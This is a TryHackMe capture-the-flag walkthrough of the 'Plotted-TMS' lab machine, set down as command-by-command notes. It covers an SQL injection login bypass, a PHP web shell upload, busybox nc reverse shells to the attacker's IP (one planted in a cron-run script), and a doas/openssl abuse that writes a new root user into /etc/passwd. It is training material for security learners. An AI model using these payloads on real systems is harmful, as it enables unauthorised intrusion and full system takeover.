---
tags:
  - THM
  - Linux
  - Easy
  - SQLi
  - File-Upload
  - RCE
  - Cron
  - SUID
---
https://tryhackme.com/room/plottedtms/

# IPs

Target machine:

```text
10.67.139.180
```

Attacker's machine:

```text
192.168.137.46
```

# Enumeration

Port scanning:

```console
$ nmap -p22,80,445 -sV -sC 10.67.139.180

PORT    STATE SERVICE VERSION
22/tcp  open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 a3:6a:9c:b1:12:60:b2:72:13:09:84:cc:38:73:44:4f (RSA)
|   256 b9:3f:84:00:f4:d1:fd:c8:e7:8d:98:03:38:74:a1:4d (ECDSA)
|_  256 d0:86:51:60:69:46:b2:e1:39:43:90:97:a6:af:96:93 (ED25519)
80/tcp  open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
445/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_smb2-time: Protocol negotiation failed (SMB2)
```

Both webs (ports 80 and 445) look as the default Apache site.

Discovered using `ffuf` that the web at port 80 has many irrelevant directories and files.

Meanwhile, the web at port 445 has a login panel at `/management/admin/login.php`:

```console
$ ffuf -u 'http://10.67.139.180:445/FUZZ' -w /usr/share/seclists/Discovery/Web-Content/common.txt
...
.htpasswd               [Status: 403, Size: 279, Words: 20, Lines: 10, Duration: 204ms]
.hta                    [Status: 403, Size: 279, Words: 20, Lines: 10, Duration: 3600ms]
.htaccess               [Status: 403, Size: 279, Words: 20, Lines: 10, Duration: 4613ms]
index.html              [Status: 200, Size: 10918, Words: 3499, Lines: 376, Duration: 112ms]
management              [Status: 301, Size: 324, Words: 20, Lines: 10, Duration: 108ms]
server-status           [Status: 403, Size: 279, Words: 20, Lines: 10, Duration: 110ms]
```

Successfully logged in as **admin** by abusing SQLi using the next username field:

```text
admin' OR 1=1-- -
```

# Exploitation

The submission of the system logo is allowed. However, there are no image filters, allowing to upload the next `rev.php` file:

```php
<?php echo "<pre>" . shell_exec($_GET["cmd"]) . "</pre>"; ?>
```

Listen for connections:

```console
$ ncat -lvnp 4444
```

Trigger the reverse shell connection:

```console
$ cmd=$(urlencode -a <<< 'busybox nc 192.168.137.46 4444 -e /bin/bash')

$ curl -s "http://10.67.139.180:445/management/uploads/1788241260_rev.php?cmd=$cmd"
```

# Post-Exploitation

## User Migration

We are currently **www-data** user:

```console
$ id

uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Found **plot_admin** user:

```console
$ grep 'sh$' /etc/passwd

root:x:0:0:root:/root:/bin/bash
ubuntu:x:1000:1000:ubuntu:/home/ubuntu:/bin/bash
plot_admin:x:1001:1001:,,,:/home/plot_admin:/bin/bash
```

Found interesting cron job:

```console
$ grep -v '^#' /etc/crontab

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
* * 	* * *	plot_admin /var/www/scripts/backup.sh
```

Can not write the `/var/www/scripts/backup.sh` file or abuse its contents:

```console
$ ls -l /var/www/scripts/backup.sh
-rwxrwxr-- 1 plot_admin plot_admin 141 Oct 28  2021 /var/www/scripts/backup.sh

$ cat /var/www/scripts/backup.sh
#!/bin/bash

/usr/bin/rsync -a /var/www/html/management /home/plot_admin/tms_backup
/bin/chmod -R 770 /home/plot_admin/tms_backup/management
```

However, we own the parent folder, so we can remove it and create a reverse shell:

```console
$ ls -ld /var/www/scripts
drwxr-xr-x 2 www-data www-data 4096 Oct 28  2021 /var/www/scripts

$ rm /var/www/scripts/backup.sh
rm: remove write-protected regular file '/var/www/scripts/backup.sh'? y

$ echo -e '#!/bin/bash\nbusybox nc 192.168.137.46 9001 -e /bin/bash' > /var/www/scripts/backup.sh

$ chmod +x /var/www/scripts/backup.sh
```

Listen for connections:

```console
$ nc -lvnp 9001
```

Get the **user flag**:

```console
$ cat /home/plot_admin/user.txt
```

## Privilege Escalation

Found `/usr/bin/doas` with SUID permissions:

```console
$ find / -perm -4000 2>/dev/null | grep -v '^/snap'

/usr/bin/passwd
/usr/bin/sudo
/usr/bin/gpasswd
/usr/bin/mount
/usr/bin/su
/usr/bin/chfn
/usr/bin/fusermount
/usr/bin/at
/usr/bin/chsh
/usr/bin/umount
/usr/bin/doas
/usr/bin/newgrp
/usr/libexec/polkit-agent-helper-1
/usr/lib/snapd/snap-confine
/usr/lib/eject/dmcrypt-get-device
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
```

Checked the configuration file and found that we can run `openssl` as **root**:

```console
$ cat /etc/doas.conf 

permit nopass plot_admin as root cmd openssl
```

Wrote the `/etc/passwd` to create a **custom root user (groot)**:

```console
$ echo "groot:$(openssl passwd -1 'pass123'):0:0:groot:/root:/bin/bash" | cat /etc/passwd - > /tmp/passwd

$ /usr/bin/doas -u root openssl
OpenSSL> enc -in /tmp/passwd -out /etc/passwd
OpenSSL> q

$ su groot
Password:
```

Get the **root flag**:

```console
# cat /root/root.txt
```
